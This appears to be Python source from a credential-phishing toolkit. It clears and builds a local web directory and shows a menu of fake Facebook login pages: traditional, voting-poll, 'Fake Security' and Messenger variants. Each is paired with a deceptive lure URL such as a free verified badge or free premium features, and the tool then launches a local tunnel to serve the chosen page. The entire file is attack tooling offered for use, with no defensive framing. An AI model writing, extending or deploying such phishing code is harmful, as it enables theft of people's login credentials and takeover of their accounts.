from libraries import *
from setupsite import *
# Directories
if not os.path.exists(".server"):
    os.makedirs(".server")

if os.path.exists(".server/www"):
    shutil.rmtree(".server/www")
    os.makedirs(".server/www")
else:
    os.makedirs(".server/www")

if os.path.exists(".cld.log"):
    os.remove(".cld.log")

# Script termination
def exit_on_signal_SIGINT(signum, frame):
    print(f"\n\n{RED}[{WHITE}!{RED}]{RED} Program Interrupted.")
    reset_color()
    sys.exit(0)

def exit_on_signal_SIGTERM(signum, frame):
    print(f"\n\n{RED}[{WHITE}!{RED}]{RED} Program Terminated.")
    reset_color()
    sys.exit(0)

signal.signal(signal.SIGINT, exit_on_signal_SIGINT)
signal.signal(signal.SIGTERM, exit_on_signal_SIGTERM)

def tunnel_menu(website):
    clear()
    banner_small()

    print(f"""
    {RED}[{WHITE}+{RED}]{CYAN} Loading    {RED}[{ORANGE}+{RED}]""")
    time.sleep(1)
    print(f"""
    {RED}[{BLUE}-{RED}]{WHITE} Testing  {RED}[{CYAN}-{RED}]""")
    time.sleep(1)
    print(f"""
    {RED}[{ORANGE}*{RED}]{BLUE} Creating  {ORANGE}[{RED}*{ORANGE}]
    """)
    time.sleep(3)
    clear()
    banner_small()
    start_localhost(website)


def site_facebook():
    kill_pid()
    clear()
    banner_small()
    print(f"""
    {RED}[{ORANGE}01{RED}]{CYAN} Traditional Login Page
    {RED}[{WHITE}02{RED}]{CYAN} Advanced Voting Poll Login Page
    {RED}[{BLUE}03{RED}]{CYAN} Fake Security Login Page
    {RED}[{GREEN}04{RED}]{CYAN} Facebook Messenger Login Page
    {RED}[{MAGENTA}00{RED}]{CYAN} Exit
    """)

    user_input = input(f"    {GREEN}[{RED}-{GREEN}]{WHITE} Select an option : {ORANGE}")
    if user_input in ['1', '01']:
        website = "facebook"
        mask = 'http://blue-verified-badge-for-facebook-free'
        tunnel_menu(website)
    elif user_input in ['2', '02']:
        website = "fb_advanced"
        mask = 'http://vote-for-the-best-social-media'
        tunnel_menu(website)
    elif user_input in ['3', '03']:
        website = "fb_security"
        mask = 'http://make-your-facebook-secured-and-free-from-hackers'
        tunnel_menu(website)
    elif user_input in ['4', '04']:
        website = "fb_messenger"
        mask = 'http://get-messenger-premium-features-free'
        tunnel_menu(website)
    elif user_input in ['0', '00']:
        msg_exit()
    else:
        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
        time.sleep(1)
        os.system('clear')
        banner_small()
        site_facebook()
